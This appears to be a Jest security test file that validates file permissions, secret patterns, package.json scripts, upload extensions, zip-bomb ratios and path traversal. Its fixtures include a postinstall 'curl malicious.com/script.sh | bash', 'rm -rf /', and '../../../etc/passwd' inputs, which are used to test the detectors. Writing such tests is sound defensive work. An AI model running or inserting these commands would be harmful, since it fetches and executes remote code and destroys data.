/**
 * File Security Tests
 * 
 * Tests for file permission and security validation without complex dependencies
 */

const fs = require('fs');
const path = require('path');

describe('File Security', () => {
  const projectRoot = path.resolve(__dirname, '../..');

  describe('File Permissions', () => {
    test('should validate critical file permissions', () => {
      const criticalFiles = [
        'package.json',
        'tsconfig.json',
        '.env.example'
      ];

      const checkFilePermissions = (filePath) => {
        if (!fs.existsSync(filePath)) {
          return { exists: false };
        }

        const stats = fs.statSync(filePath);
        const mode = stats.mode;

        return {
          exists: true,
          isWorldWritable: !!(mode & parseInt('002', 8)),
          isWorldReadable: !!(mode & parseInt('004', 8)),
          isOwnerReadable: !!(mode & parseInt('400', 8)),
          isOwnerWritable: !!(mode & parseInt('200', 8)),
          octalMode: (mode & parseInt('777', 8)).toString(8)
        };
      };

      criticalFiles.forEach(file => {
        const filePath = path.join(projectRoot, file);
        const permissions = checkFilePermissions(filePath);

        if (permissions.exists) {
          expect(permissions.isWorldWritable).toBe(false);
          expect(permissions.isOwnerReadable).toBe(true);
        }
      });
    });

    test('should detect potentially dangerous file permissions', () => {
      const checkDangerousPermissions = (mode) => {
        const warnings = [];

        // World writable (dangerous)
        if (mode & parseInt('002', 8)) {
          warnings.push('World writable');
        }

        // Executable for others (potentially dangerous)
        if (mode & parseInt('001', 8)) {
          warnings.push('Executable by others');
        }

        // Too permissive (777)
        if ((mode & parseInt('777', 8)) === parseInt('777', 8)) {
          warnings.push('Too permissive (777)');
        }

        return warnings;
      };

      expect(checkDangerousPermissions(parseInt('644', 8))).toHaveLength(0);
      expect(checkDangerousPermissions(parseInt('777', 8)).length).toBeGreaterThan(0);
      expect(checkDangerousPermissions(parseInt('666', 8)).length).toBeGreaterThan(0);
    });
  });

  describe('Directory Security', () => {
    test('should validate critical directory structure', () => {
      const requiredDirs = [
        'apps/cli/src',
        'tests',
        'scripts'
      ];

      requiredDirs.forEach(dir => {
        const dirPath = path.join(projectRoot, dir);
        expect(fs.existsSync(dirPath)).toBe(true);
        
        if (fs.existsSync(dirPath)) {
          const stats = fs.statSync(dirPath);
          expect(stats.isDirectory()).toBe(true);
        }
      });
    });

    test('should check for suspicious directories', () => {
      const suspiciousPatterns = [
        '.git/hooks',
        'node_modules/.bin',
        'temp',
        'tmp'
      ];

      const checkSuspiciousDir = (dirPattern) => {
        const fullPath = path.join(projectRoot, dirPattern);
        if (fs.existsSync(fullPath)) {
          const stats = fs.statSync(fullPath);
          return {
            exists: true,
            isWorldWritable: !!(stats.mode & parseInt('002', 8))
          };
        }
        return { exists: false };
      };

      suspiciousPatterns.forEach(pattern => {
        const result = checkSuspiciousDir(pattern);
        if (result.exists) {
          expect(result.isWorldWritable).toBe(false);
        }
      });
    });
  });

  describe('File Content Security', () => {
    test('should detect sensitive content in configuration files', () => {
      const detectSensitiveContent = (content) => {
        const sensitivePatterns = [
          /password\s*[=:]\s*['"]?[^'"\s]+/i,
          /secret\s*[=:]\s*['"]?[^'"\s]+/i,
          /api_key\s*[=:]\s*['"]?[^'"\s]+/i,
          /private_key\s*[=:]/i,
          /-----BEGIN PRIVATE KEY-----/i
        ];

        const findings = [];
        sensitivePatterns.forEach((pattern, index) => {
          if (pattern.test(content)) {
            findings.push(`Sensitive pattern ${index + 1} detected`);
          }
        });

        return findings;
      };

      const safeContent = 'NODE_ENV=test\nPORT=3000\n# This is a comment';
      const dangerousContent = 'NODE_ENV=test\nPASSWORD=secret123\nAPI_KEY=abc123';

      expect(detectSensitiveContent(safeContent)).toHaveLength(0);
      expect(detectSensitiveContent(dangerousContent).length).toBeGreaterThan(0);
    });

    test('should validate package.json security', () => {
      const validatePackageJson = (packageContent) => {
        let packageData;
        try {
          packageData = JSON.parse(packageContent);
        } catch {
          return ['Invalid JSON format'];
        }

        const issues = [];

        // Check for suspicious scripts
        if (packageData.scripts) {
          for (const [scriptName, scriptCommand] of Object.entries(packageData.scripts)) {
            if (typeof scriptCommand === 'string') {
              if (scriptCommand.includes('rm -rf') || scriptCommand.includes('format')) {
                issues.push(`Dangerous script: ${scriptName}`);
              }
              if (scriptCommand.includes('curl') && scriptCommand.includes('bash')) {
                issues.push(`Potentially dangerous download and execute: ${scriptName}`);
              }
            }
          }
        }

        // Check for suspicious dependencies
        const allDeps = {
          ...packageData.dependencies || {},
          ...packageData.devDependencies || {}
        };

        const suspiciousDeps = ['evil-package', 'malicious-lib'];
        for (const dep of Object.keys(allDeps)) {
          if (suspiciousDeps.includes(dep)) {
            issues.push(`Suspicious dependency: ${dep}`);
          }
        }

        return issues;
      };

      const safePackage = JSON.stringify({
        name: 'test-app',
        scripts: { start: 'node index.js', test: 'jest' },
        dependencies: { express: '^4.0.0' }
      });

      const dangerousPackage = JSON.stringify({
        name: 'test-app',
        scripts: { 
          postinstall: 'curl malicious.com/script.sh | bash',
          dangerous: 'rm -rf /'
        },
        dependencies: { 'evil-package': '^1.0.0' }
      });

      expect(validatePackageJson(safePackage)).toHaveLength(0);
      expect(validatePackageJson(dangerousPackage).length).toBeGreaterThan(0);
    });
  });

  describe('File Upload Security', () => {
    test('should validate file extensions', () => {
      const isAllowedFileType = (filename) => {
        const allowedExtensions = ['.js', '.ts', '.json', '.md', '.txt', '.yml', '.yaml'];
        const dangerousExtensions = ['.exe', '.bat', '.sh', '.ps1', '.com', '.scr'];

        const ext = path.extname(filename).toLowerCase();
        
        if (dangerousExtensions.includes(ext)) {
          return false;
        }
        
        return allowedExtensions.includes(ext);
      };

      expect(isAllowedFileType('safe-file.js')).toBe(true);
      expect(isAllowedFileType('config.json')).toBe(true);
      expect(isAllowedFileType('malicious.exe')).toBe(false);
      expect(isAllowedFileType('script.sh')).toBe(false);
    });

    test('should validate file size limits', () => {
      const validateFileSize = (size, maxSize = 10 * 1024 * 1024) => { // 10MB default
        return size <= maxSize;
      };

      expect(validateFileSize(1024)).toBe(true); // 1KB
      expect(validateFileSize(100 * 1024 * 1024)).toBe(false); // 100MB
    });

    test('should detect potential zip bombs', () => {
      const detectZipBomb = (originalSize, uncompressedSize) => {
        const compressionRatio = uncompressedSize / originalSize;
        const suspiciousRatio = 100; // If uncompressed is 100x larger than compressed
        
        return compressionRatio > suspiciousRatio;
      };

      expect(detectZipBomb(1024, 50 * 1024)).toBe(false); // Normal compression
      expect(detectZipBomb(1024, 200 * 1024 * 1024)).toBe(true); // Suspicious compression
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should prevent directory traversal attacks', () => {
      const sanitizePath = (userPath) => {
        // Prevent going outside the allowed directory first
        if (userPath.includes('..')) {
          return null;
        }
        
        // Normalize the path after checking for traversal attempts
        const normalized = path.normalize(userPath);
        
        // Prevent absolute paths
        if (path.isAbsolute(normalized)) {
          return null;
        }
        
        return normalized;
      };

      expect(sanitizePath('safe/path.txt')).toBe('safe/path.txt');
      expect(sanitizePath('../../../etc/passwd')).toBe(null);
      expect(sanitizePath('/etc/passwd')).toBe(null);
      expect(sanitizePath('safe/../other/path.txt')).toBe(null);
    });

    test('should validate file access within allowed directories', () => {
      const isPathAllowed = (requestedPath, allowedBasePath) => {
        const resolvedPath = path.resolve(allowedBasePath, requestedPath);
        const normalizedBasePath = path.resolve(allowedBasePath);
        
        return resolvedPath.startsWith(normalizedBasePath);
      };

      const basePath = '/safe/directory';
      
      expect(isPathAllowed('file.txt', basePath)).toBe(true);
      expect(isPathAllowed('subdir/file.txt', basePath)).toBe(true);
      expect(isPathAllowed('../../../etc/passwd', basePath)).toBe(false);
    });
  });
});